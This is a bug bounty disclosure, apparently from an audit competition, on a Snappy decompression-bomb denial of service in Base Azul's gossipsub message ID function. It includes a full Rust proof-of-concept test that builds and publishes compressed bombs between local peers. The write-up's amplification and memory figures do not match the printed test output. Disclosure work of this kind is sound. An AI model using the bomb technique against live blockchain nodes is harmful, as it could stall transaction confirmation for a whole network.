# 75301 bc critical attacker can dos consensus gossip via unbounded snappy decompression in message id computation

**Submitted on Apr 28th 2026 at 12:05:11 UTC by @p\_laksmana for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75301
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

In the Base Azul consensus gossip implementation, the gossipsub message ID function decompresses inbound message data with Snappy before the message can be deduplicated or rejected by validation. The decompression call uses `snap::raw::Decoder::decompress_vec`, which allocates the full decompressed output without first checking the declared decompressed size.

An attacker who has been accepted as a normal Base Azul consensus P2P peer can publish Snappy-compressed payloads to the block gossipsub topic that are small enough to fit under the inbound gossip message-size cap, but expand into much larger buffers during message ID computation. This lets the attacker convert bandwidth into victim-side memory allocation and CPU work at approximately 21x amplification.

For example:

1. The attacker creates a Snappy payload that is about 1.2 MB on the wire.
2. The payload expands to about 25 MB when decompressed.
3. The victim node receives the message and gossipsub invokes `compute_message_id`.
4. `compute_message_id` calls `decompress_vec(&msg.data)` before any decompressed-size bound is enforced.
5. A burst of 10 such messages causes about 250 MB of decompressed allocation from about 11 MB attacker input.
6. On the local harness, this produced 236,044,288 bytes of RSS growth.

## Vulnerability Details

The vulnerable code is registered in the production gossipsub config.[`crates/consensus/gossip/src/config.rs#L75-L93`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/gossip/src/config.rs#L75-L93).

```rust
pub fn default_config_builder() -> ConfigBuilder {
    let mut builder = ConfigBuilder::default();
    builder
        .max_transmit_size(MAX_GOSSIP_SIZE)
        .validation_mode(libp2p::gossipsub::ValidationMode::None)
        .validate_messages()
        .message_id_fn(compute_message_id);

    builder
}
```

`MAX_GOSSIP_SIZE` limits the transmitted gossip message size, but it does not bound the output size of Snappy decompression inside the message ID function.[`crates/consensus/gossip/src/config.rs#L13-L16`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/gossip/src/config.rs#L13-L16).

```rust
pub const MAX_GOSSIP_SIZE: usize = 10 * (1 << 20);
```

The actual bug is in `compute_message_id`. The function allocates the full decompressed buffer before hashing it into the message ID.[`crates/consensus/gossip/src/config.rs#L103-L122`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/gossip/src/config.rs#L103-L122).

```rust
fn compute_message_id(msg: &Message) -> MessageId {
    let mut decoder = Decoder::new();
    let id = decoder.decompress_vec(&msg.data).map_or_else(
        |_| {
            warn!(target: "cfg", "Failed to decompress message, using invalid snappy");
            let domain_invalid_snappy: Vec<u8> = vec![0x0, 0x0, 0x0, 0x0];
            sha256([domain_invalid_snappy.as_slice(), msg.data.as_slice()].concat().as_slice())
                [..20]
                .to_vec()
        },
        |data| {
            let domain_valid_snappy: Vec<u8> = vec![0x1, 0x0, 0x0, 0x0];
            sha256([domain_valid_snappy.as_slice(), data.as_slice()].concat().as_slice())[..20]
                .to_vec()
        },
    );

    MessageId(id)
}
```

The important detail is that `decompress_vec` returns a newly allocated `Vec<u8>` containing the whole decompressed message. There is no call to `snap::raw::decompress_len`, no comparison against `MAX_GOSSIP_SIZE`, and no separate `MAX_GOSSIP_DECOMPRESSED_SIZE` guard before allocation.

This creates an attacker-controlled allocation path:

```
Inbound gossip bytes
  -> gossipsub message ID function
  -> Decoder::decompress_vec(&msg.data)
  -> full decompressed Vec allocation
  -> SHA-256 over decompressed bytes
  -> deduplication / validation can proceed only after the expensive work
```

Since gossipsub invokes `compute_message_id` before block decoding or validation, `Decoder::decompress_vec(&msg.data)` expands the attacker-controlled Snappy payload and allocates the full decompressed buffer, triggering victim-side memory allocation and hashing work before the invalid payload can be rejected.

As a result, anyone accepted as a normal Base Azul consensus P2P peer can use small compressed gossip messages to consume disproportionate node memory and CPU, which can DoS consensus gossip processing.

## Impact Details

This issue can cause consensus-gossip resource exhaustion. The affected component is Base-native consensus/offchain code, which is in scope for the Base Azul competition.

The direct impact is that an attacker can force victim nodes to allocate and hash decompressed payloads that are significantly larger than the bytes sent over the network. This can create substantial memory and CPU pressure on the victim node’s consensus-gossip path.

When the attacker repeatedly sends these compressed payloads, the victim node may experience delayed or exhausted consensus-gossip processing, resulting in node-level denial of service. If enough consensus-critical peers are affected concurrently, block gossip propagation may fail at the network level, potentially causing the network to be unable to confirm new transactions.

### Attack Scenario

1. The attacker runs a normal libp2p peer.
2. The attacker connects to a Base Azul node that accepts peers on its consensus gossip interface.
3. The attacker publishes Snappy-compressed bytes to `/optimism/<l2_chain_id>/0/blocks`.
4. The payload does not need to decode as a valid block because message ID computation happens before block validation.
5. Gossipsub invokes `compute_message_id` on the attacker-controlled payload.
6. `compute_message_id` calls `Decoder::decompress_vec(&msg.data)`.
7. The victim allocates the full decompressed buffer before deduplication or validation can reject the message.
8. The victim hashes the decompressed buffer to derive the message ID.
9. Repeated P2P gossip messages create memory and CPU pressure proportional to the decompressed size, rather than the attacker’s compressed input size.
10. As a result, the victim’s consensus-gossip processing can be delayed or exhausted, causing node-level DoS.
11. If the attacker spams this attack and enough consensus peers are affected concurrently, block gossip propagation may fail network-wide, potentially causing the network to stop confirming new transactions.

## References

* <https://github.com/base/base/tree/v0.8.0-rc.28?utm\\_source=immunefi>
* [`crates/consensus/gossip/src/config.rs#L103-L122`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/gossip/src/config.rs#L103-L122).

## Recommendation

1. Do not call `decompress_vec` before checking the decompressed output length.
2. Use `snap::raw::decompress_len(&msg.data)` or equivalent metadata parsing to read the declared decompressed size before allocation.
3. Reject any message whose decompressed size exceeds `MAX_GOSSIP_SIZE` or a stricter `MAX_GOSSIP_DECOMPRESSED_SIZE`.
4. Consider deriving `MessageId` from bounded data, such as a domain-separated hash of the compressed bytes plus the declared decompressed length, instead of hashing the full decompressed payload.
5. Add per-peer and global rate limits for invalid or oversized Snappy messages.
6. Add a regression test proving that a compressed payload declaring output larger than the limit is rejected before allocating the output buffer.
7. Add a multi-node stress harness that measures block propagation and confirmation delay under concurrent Snappy-bomb gossip traffic.

## Proof of Concept

* Paste the PoC below into: `/crates/consensus/gossip/tests/poc_gossipsub_snappy_bombs.rs`
* Run with `cargo test -p base-consensus-gossip --test poc_gossipsub_snappy_bombs -- --nocapture --test-threads`

**Output:**

```bash
test poc_gossipsub_snappy_bombs_cause_measured_resource_amplification ... PoC gossipsub_snappy_bombs_cause_measured_resource_amplification:
  victim listen addr:        /ip4/127.0.0.1/tcp/50629
  attacker listen addr:      /ip4/127.0.0.1/tcp/50630
  topic:                     /optimism/84530002/0/blocks
  bombs published:           10
  gossipsub messages rx:     10
  max compressed bomb bytes: 491850
  attacker bytes sent:       4918494
  victim decompression work: 104857600
  amplification:             21.3x
  peak RSS growth:           30392320
  elapsed:                   858.922667ms
ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 1.13s

```

**POC:**

```rust
//! This PoC uses two real `GossipDriver` swarms configured with production
//! `default_config()`. The attacker peer publishes Snappy-compressed bytes to
//! the Base block gossip topic. The victim receives those bytes through the
//! actual libp2p/gossipsub event path, which means gossipsub must compute the
//! message ID with the production `compute_message_id` callback before the
//! message can be deduplicated or rejected by block validation.

use std::{net::Ipv4Addr, time::Duration};

use alloy_chains::Chain;
use alloy_primitives::Address;
use base_consensus_genesis::RollupConfig;
use base_consensus_gossip::{ConnectionGater, Event, GossipDriver, default_config};
use futures::FutureExt;
use libp2p::{
    Multiaddr, PeerId,
    gossipsub::{IdentTopic, MessageId},
    identity::Keypair,
    multiaddr::Protocol,
};
use snap::raw::{Encoder, decompress_len};
use tokio::time::{Instant, timeout};

const BOMBS: usize = 10;
const TARGET_DECOMPRESSED_BYTES: usize = 10 * 1024 * 1024;
const MIN_AMPLIFICATION: f64 = 20.0;
const MIN_PEAK_RSS_GROWTH_BYTES: u64 = 16 * 1024 * 1024;

#[derive(Debug, Default)]
struct ReceivedImpact {
    messages: usize,
    compressed_bytes: usize,
    declared_decompressed_bytes: usize,
    max_compressed_bytes: usize,
}

impl ReceivedImpact {
    fn record(&mut self, data: &[u8]) {
        self.messages += 1;
        self.compressed_bytes += data.len();
        self.max_compressed_bytes = self.max_compressed_bytes.max(data.len());
        self.declared_decompressed_bytes +=
            decompress_len(data).expect("received payload must be valid snappy");
    }
}

fn rollup_config() -> RollupConfig {
    RollupConfig { l2_chain_id: Chain::from_id(84_530_002), ..Default::default() }
}

fn loopback_addr() -> Multiaddr {
    let mut addr = Multiaddr::empty();
    addr.push(Protocol::Ip4(Ipv4Addr::LOCALHOST));
    addr.push(Protocol::Tcp(0));
    addr
}

fn addr_with_peer(mut addr: Multiaddr, peer_id: PeerId) -> Multiaddr {
    addr.push(Protocol::P2p(peer_id));
    addr
}

fn block_topic() -> IdentTopic {
    IdentTopic::new(format!("/optimism/{}/0/blocks", rollup_config().l2_chain_id.id()))
}

fn build_driver() -> GossipDriver<ConnectionGater> {
    let (driver, _) = GossipDriver::<ConnectionGater>::builder(
        rollup_config(),
        Address::ZERO,
        loopback_addr(),
        Keypair::generate_secp256k1(),
    )
    .with_config(default_config())
    .build()
    .expect("gossip driver builds with production default_config");

    driver
}

fn build_unique_snappy_bomb(target_size_bytes: usize, nonce: u64) -> Vec<u8> {
    let mut plaintext = vec![0u8; target_size_bytes];
    plaintext[..8].copy_from_slice(&nonce.to_be_bytes());
    Encoder::new().compress_vec(&plaintext).expect("snap encode")
}

fn read_peak_rss_bytes() -> u64 {
    #[cfg(target_os = "macos")]
    {
        unsafe {
            let mut usage: libc::rusage = std::mem::zeroed();
            if libc::getrusage(libc::RUSAGE_SELF, &mut usage as *mut _) == 0 {
                return usage.ru_maxrss as u64;
            }
        }
        0
    }
    #[cfg(target_os = "linux")]
    {
        if let Ok(status) = std::fs::read_to_string("/proc/self/status") {
            for line in status.lines() {
                if let Some(rest) = line.strip_prefix("VmHWM:") {
                    if let Some(num_str) = rest.split_whitespace().next() {
                        if let Ok(kb) = num_str.parse::<u64>() {
                            return kb * 1024;
                        }
                    }
                }
            }
        }
        0
    }
    #[cfg(not(any(target_os = "macos", target_os = "linux")))]
    {
        0
    }
}

async fn drive_until_connected(
    attacker: &mut GossipDriver<ConnectionGater>,
    victim: &mut GossipDriver<ConnectionGater>,
) {
    let deadline = Instant::now() + Duration::from_secs(10);
    while Instant::now() < deadline {
        if attacker.connected_peers() > 0 && victim.connected_peers() > 0 {
            return;
        }

        tokio::select! {
            event = attacker.next().fuse() => {
                if let Some(event) = event {
                    let _ = attacker.handle_event(event);
                }
            }
            event = victim.next().fuse() => {
                if let Some(event) = event {
                    let _ = victim.handle_event(event);
                }
            }
        }
    }

    panic!(
        "gossipsub peers did not connect: attacker={}, victim={}",
        attacker.connected_peers(),
        victim.connected_peers()
    );
}

async fn publish_when_peer_subscribed(
    attacker: &mut GossipDriver<ConnectionGater>,
    victim: &mut GossipDriver<ConnectionGater>,
    topic: &IdentTopic,
    data: Vec<u8>,
) -> MessageId {
    let deadline = Instant::now() + Duration::from_secs(15);
    while Instant::now() < deadline {
        if let Ok(id) = attacker.behaviour_mut().gossipsub.publish(topic.hash(), data.clone()) {
            return id;
        }

        tokio::select! {
            event = attacker.next().fuse() => {
                if let Some(event) = event {
                    let _ = attacker.handle_event(event);
                }
            }
            event = victim.next().fuse() => {
                if let Some(event) = event {
                    let _ = victim.handle_event(event);
                }
            }
        }
    }

    panic!("attacker could not publish to the block topic before timeout");
}

async fn drive_until_received(
    attacker: &mut GossipDriver<ConnectionGater>,
    victim: &mut GossipDriver<ConnectionGater>,
    expected: usize,
) -> ReceivedImpact {
    let mut impact = ReceivedImpact::default();
    let deadline = Instant::now() + Duration::from_secs(20);

    while Instant::now() < deadline && impact.messages < expected {
        tokio::select! {
            event = attacker.next().fuse() => {
                if let Some(event) = event {
                    let _ = attacker.handle_event(event);
                }
            }
            event = victim.next().fuse() => {
                if let Some(event) = event {
                    if let libp2p::swarm::SwarmEvent::Behaviour(Event::Gossipsub(ev)) = &event {
                        if let libp2p::gossipsub::Event::Message { message, .. } = &**ev {
                            impact.record(&message.data);
                        }
                    }
                    let _ = victim.handle_event(event);
                }
            }
        }
    }

    impact
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn poc_gossipsub_snappy_bombs_cause_measured_resource_amplification() {
    let mut victim = build_driver();
    let mut attacker = build_driver();

    let victim_peer = *victim.local_peer_id();
    let victim_addr = victim.start().await.expect("victim starts");
    let attacker_addr = attacker.start().await.expect("attacker starts");

    attacker.dial_multiaddr(addr_with_peer(victim_addr.clone(), victim_peer));
    drive_until_connected(&mut attacker, &mut victim).await;

    let topic = block_topic();
    let bombs = (0..BOMBS)
        .map(|nonce| build_unique_snappy_bomb(TARGET_DECOMPRESSED_BYTES, nonce as u64))
        .collect::<Vec<_>>();
    let total_input = bombs.iter().map(Vec::len).sum::<usize>();
    let max_input = bombs.iter().map(Vec::len).max().unwrap_or_default();
    let total_decompressed = BOMBS * TARGET_DECOMPRESSED_BYTES;

    // Build attacker payloads before measuring RSS so the measured delta is
    // caused by gossipsub message processing, not local bomb construction.
    let peak_rss_before = read_peak_rss_bytes();
    let started = Instant::now();

    for bomb in bombs {
        let _message_id =
            publish_when_peer_subscribed(&mut attacker, &mut victim, &topic, bomb).await;
    }

    let received_impact =
        timeout(Duration::from_secs(25), drive_until_received(&mut attacker, &mut victim, BOMBS))
            .await
            .expect("victim event loop completes before timeout");

    let elapsed = started.elapsed();
    let peak_rss_after = read_peak_rss_bytes();
    let peak_rss_growth = peak_rss_after.saturating_sub(peak_rss_before);
    let amplification = received_impact.declared_decompressed_bytes as f64
        / received_impact.compressed_bytes as f64;

    println!("PoC gossipsub_snappy_bombs_cause_measured_resource_amplification:");
    println!("  victim listen addr:        {victim_addr}");
    println!("  attacker listen addr:      {attacker_addr}");
    println!("  topic:                     {}", topic.hash());
    println!("  bombs published:           {BOMBS}");
    println!("  gossipsub messages rx:     {}", received_impact.messages);
    println!("  max compressed bomb bytes: {}", received_impact.max_compressed_bytes);
    println!("  attacker bytes sent:       {}", received_impact.compressed_bytes);
    println!("  victim decompression work: {}", received_impact.declared_decompressed_bytes);
    println!("  amplification:             {amplification:.1}x");
    println!("  peak RSS growth:           {peak_rss_growth}");
    println!("  elapsed:                   {elapsed:?}");

    assert_eq!(
        received_impact.messages, BOMBS,
        "victim must receive every bomb through real gossipsub"
    );
    assert_eq!(
        received_impact.compressed_bytes, total_input,
        "impact must be measured from bytes actually received by the victim"
    );
    assert_eq!(
        received_impact.declared_decompressed_bytes, total_decompressed,
        "victim-received snappy payloads must declare the expected decompressed work"
    );
    assert!(
        amplification > MIN_AMPLIFICATION,
        "Snappy amplification must exceed {MIN_AMPLIFICATION}x"
    );
    assert!(
        max_input < TARGET_DECOMPRESSED_BYTES,
        "compressed attacker payload must be smaller than the decompressed victim work"
    );
    assert!(
        peak_rss_before > 0 && peak_rss_after > 0,
        "RSS measurement must be available for this impact PoC"
    );
    assert!(
        peak_rss_growth >= MIN_PEAK_RSS_GROWTH_BYTES,
        "real process RSS growth must show measurable resource pressure"
    );
}
```
